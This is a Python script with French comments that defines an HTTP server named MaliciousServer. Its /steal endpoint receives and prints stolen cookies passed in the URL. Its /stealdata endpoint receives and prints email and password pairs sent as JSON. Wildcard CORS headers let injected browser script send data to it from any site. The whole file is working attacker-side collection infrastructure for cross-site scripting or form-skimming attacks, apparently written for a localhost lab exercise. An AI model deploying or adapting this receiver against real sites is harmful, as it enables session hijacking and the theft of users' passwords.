from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import json

class MaliciousServer(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        # Gérer les requêtes OPTIONS pour CORS
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")  # Autoriser toutes les origines
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")  # Méthodes supportées
        self.send_header("Access-Control-Allow-Headers", "Content-Type")  # Headers supportés
        self.end_headers()

    def do_GET(self):
        # Vérification du chemin pour les cookies
        if self.path.startswith('/steal'):
            # Extraire le paramètre "cookie" depuis l'URL
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)

            # Récupérer la valeur du cookie
            cookie = params.get('cookie', [''])[0]  # Par défaut, retourne une chaîne vide si absent

            # Afficher les cookies
            print(f"[STEAL COOKIE] Received cookie: {cookie}")

            # Réponse au client
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")  # Autoriser toutes les origines
            self.end_headers()
            self.wfile.write(b"Cookie received!")

    def do_POST(self):
        # Vérification du chemin pour les données utilisateur
        if self.path == '/stealdata':
            # Récupérer la longueur du contenu
            content_length = int(self.headers['Content-Length'])

            # Lire les données POST envoyées
            post_data = self.rfile.read(content_length)

            try:
                # Charger les données JSON
                data = json.loads(post_data)

                # Afficher les données (email et mot de passe)
                email = data.get('email', 'N/A')
                password = data.get('password', 'N/A')
                print(f"[STEAL DATA] Email: {email}, Password: {password}")

                # Répondre au client
                self.send_response(200)
                self.send_header("Access-Control-Allow-Origin", "*")  # Autoriser toutes les origines
                self.end_headers()
                self.wfile.write(b"Data received!")

            except json.JSONDecodeError:
                # Gestion des erreurs si les données ne sont pas valides
                self.send_response(400)
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(b"Invalid data format!")

# Configuration du serveur
host = "127.0.0.1"
port = 8080  
server = HTTPServer((host, port), MaliciousServer)
print(f"Server running on http://{host}:{port}")
server.serve_forever()
